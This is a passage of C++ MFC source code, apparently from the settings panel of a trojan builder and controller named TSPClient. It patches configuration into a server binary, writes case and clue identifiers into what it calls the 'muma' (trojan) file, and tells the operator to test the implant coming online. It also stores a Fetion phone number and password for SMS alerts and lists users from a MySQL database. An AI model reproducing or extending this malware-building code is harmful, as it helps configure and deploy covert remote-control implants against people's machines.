		if ( !UpdateResource(hUpdate, "INFORMATION", MAKEINTRESOURCE(IDR_CONFIG), 0, strServiceConfig.GetBuffer(0), strServiceConfig.GetLength() + 1 ) )
		{
			CloseHandle(hUpdate);
			strErr = ("配置时失败");
			DeleteFile(TmpPath);
			break;
		}

		EndUpdateResource( hUpdate, FALSE );
		DeleteFile(m_strServerFile);
		MoveFile(TmpPath, m_strServerFile);
		strErr = ("生成文件成功，请测试上线。");
		uType=MB_OK;

	} while (FALSE);

	// 	::PostMessage(m_dlgProgress.m_hWnd, WM_QUIT, NULL, NULL);
	//strErr.Format("%s :%d",strErr.GetBuffer(),GetLastError());

	if (!strErr.IsEmpty())
	{
		m_dlgProgress.MessageBox(strErr,"友情提示",uType);
	}
	//m_dlgProgress.SendMessage(WM_CLOSE);


	return 0;	
}


void CSettingsView::OnBnClickedBaojian()
{
	CString str;

	GetDlgItem(IDC_BAOJIAN)->GetWindowText(str);
	CIniFile IniFile;

	CString AppName="Mobile";
	
	if (str=="开启")
	{

		CString strTelNum,strFetionPass;
		GetDlgItem(IDC_MOBILE_EDIT)->GetWindowText(strTelNum);
		GetDlgItem(IDC_FETIONPWD_EDIT)->GetWindowText(strFetionPass);
		
		if(strTelNum.IsEmpty()||strFetionPass.IsEmpty())
		{
			CString strtmp=IniFile.GetString(AppName,"Tel1","");
			CString strtmpPwd=IniFile.GetString(AppName,"PWD","");

			if (strtmp==""||strtmpPwd=="")
			{
				AfxMessageBox("第一次设置飞信手机号或者密码不能为空!");
				return;
			}
		}
		else
		{
			IniFile.SetString(AppName,"Tel1",strTelNum);
			IniFile.SetString(AppName,"PWD",EnDeCode::Encode(EnDeCode::encrypt(strFetionPass.GetBuffer())));
			AfxMessageBox("第一次设置飞信时需用迷你飞信登录一次!");
			TCHAR szFetion[MAX_PATH]={0};
			wsprintf(szFetion,"%s\\fetion\\迷你飞信.exe",GetExeCurrentDir());
			CProcess::KillAllProcessByName(szFetion);
			WinExec(szFetion,0);
		}

		IniFile.SetString(AppName,"start","true");
		GetDlgItem(IDC_BAOJIAN)->SetWindowText("关闭");
		GetDlgItem(IDC_BAOJIANSTATE)->SetWindowText("报警功能已开启");

	}
	else
	{
		IniFile.SetString(AppName,"start","false");
		GetDlgItem(IDC_BAOJIAN)->SetWindowText("开启");
		GetDlgItem(IDC_BAOJIANSTATE)->SetWindowText("报警功能已关闭");
	}

	// TODO: 在此添加控件通知处理程序代码
}


// void CSettingsView::OnBnClickedIdcShengcheng()
// {
// 	// TODO: 在此添加控件通知处理程序代码
// }

void CSettingsView::OnBnClickedFilterUnknown()
{
	// TODO: Add your control notification handler code here
	UpdateData();
	UpdateData(TRUE);
	((CTSPClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "filter unknown clue", m_filterUnknown);
	((CTSPClientApp *)AfxGetApp())->m_filterUnknown = m_filterUnknown;

}

void CSettingsView::OnBnClickedAutoSelectVisible()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	((CTSPClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "auto select and visible", m_autoSelectVisible);
	((CTSPClientApp *)AfxGetApp())->m_autoSelectVisible = m_autoSelectVisible;
}

void CSettingsView::OnEnChangeMaxConnect()
{
	// TODO:  If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CFormView::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO:  Add your control notification handler code here
	UpdateData(TRUE);
	((CTSPClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "max connect", m_MaxConnect);

	
}




DWORD GetFileLen(CString strFile)
{

	HANDLE hFile = ::CreateFile(strFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return 0;
	}

	DWORD dwFileSize=GetFileSize(hFile,0);
	CloseHandle(hFile);

	return dwFileSize;

}


BYTE *GetFileBuffer(LPCTSTR strFile)
{

	//先处理文件
	if (NULL == strFile)
	{
		return NULL;
	}

	HANDLE hFile = ::CreateFile(strFile, GENERIC_READ, FILE_SHARE_READ , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hFile){
		return NULL;
	}

	BOOL bRet = FALSE;
	BYTE *pBuf = NULL;
	DWORD dwSizeLow = 0;
	do 
	{
		DWORD dwSizeHigh = 0;
		dwSizeLow = ::GetFileSize(hFile, &dwSizeHigh);
		if (INVALID_FILE_SIZE == dwSizeLow || dwSizeHigh > 0)
		{
			break;
		}

		//dwSizeLow++;

		pBuf = new BYTE[dwSizeLow+1];
		memset(pBuf,0,dwSizeLow+1);
		DWORD dwRead = 0;
		BOOL bRetRead = ::ReadFile(hFile, pBuf, dwSizeLow, &dwRead, NULL);
		if (!bRetRead || dwRead != dwSizeLow)
		{
			break;
		}

		bRet = TRUE;

	}while(FALSE);

	::CloseHandle(hFile);

	if (!bRet)
	{
		SAFE_DELARRAY(pBuf);
		pBuf=NULL;
	}

	return pBuf;

}

BOOL WriteDataToFile(LPCSTR lpFileName,LPCSTR szData,DWORD dwSize,DWORD dwMoveMethod)
{
	HANDLE hFile = CreateFileA(lpFileName,GENERIC_READ|GENERIC_WRITE,NULL,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,
		NULL
		);
	if (hFile==INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	SetFilePointer(hFile,0,0,dwMoveMethod);

	DWORD dwBytes;
	WriteFile(hFile, szData, dwSize, &dwBytes, NULL);
	SAFE_CLOSE_FILE(hFile);
	return TRUE;
}


void CSettingsView::WriteClueToMumaFile(LPCSTR szMumaFile,LPCSTR szCase,LPCSTR szClue,int iOffsetXX)
{

	char *pServer20Buf=(char*)GetFileBuffer(szMumaFile);
	if (pServer20Buf==NULL){
		return;
	}

	DWORD dwDlllen=GetFileLen(szMumaFile);
    char * pXX = pServer20Buf +iOffsetXX;
	stu_vpn_param *stu=(stu_vpn_param*)(pXX);
	strncpy(stu->szCaseID,szCase,strlen(szCase));
	strncpy(stu->szClueID,szClue,strlen(szClue));

	DeleteFile(szMumaFile);
	WriteDataToFile(szMumaFile,pServer20Buf,dwDlllen,FILE_BEGIN);
	SAFE_DELARRAY(pServer20Buf);
	return;
}




void CSettingsView::OnCbnDropdownCombo2()
{
	MYSQL_RES *res = NULL;
	MYSQL_ROW row;
	CMyDataBase mdb;
	if(!mdb.ConnDB())
	{
		g_logErr.Log(LEVEL_ERROR,"验证tspclient使用有效性时，连接数据库出错\r\n");
		return;
	}

	char strUserInfo[256]={0}; 
	char strUserName_ID[256]={0};
	strcpy(strUserInfo,"SELECT userid,username FROM `user` WHERE username != 'admin' and visible = 1");

	res =mdb.OpenRecordset(strUserInfo);
	if (0 == res->row_count)
	{
		return;
	}


	// 	m_UserChoice.ResetContent();
	// 	m_UserChoice.SetDroppedWidth(20);//约定为10
	while(1)
	{
		if((row = mysql_fetch_row(res)) != NULL)
		{
			sprintf(strUserName_ID,"%s-%s",row[1],row[0]);
			if (m_UserChoice.FindString(-1,strUserName_ID)==CB_ERR)
			{
				m_UserChoice.AddString(strUserName_ID);
				//AfxMessageBox(strUserName_ID);

			}
			//g_pSettingView->m_UserChoice.InsertString(-1,strUserName_ID);
			memset(strUserName_ID,0,256);

		}
		else
		{
			break;
		}

	}

	// TODO: 在此添加控件通知处理程序代码
}
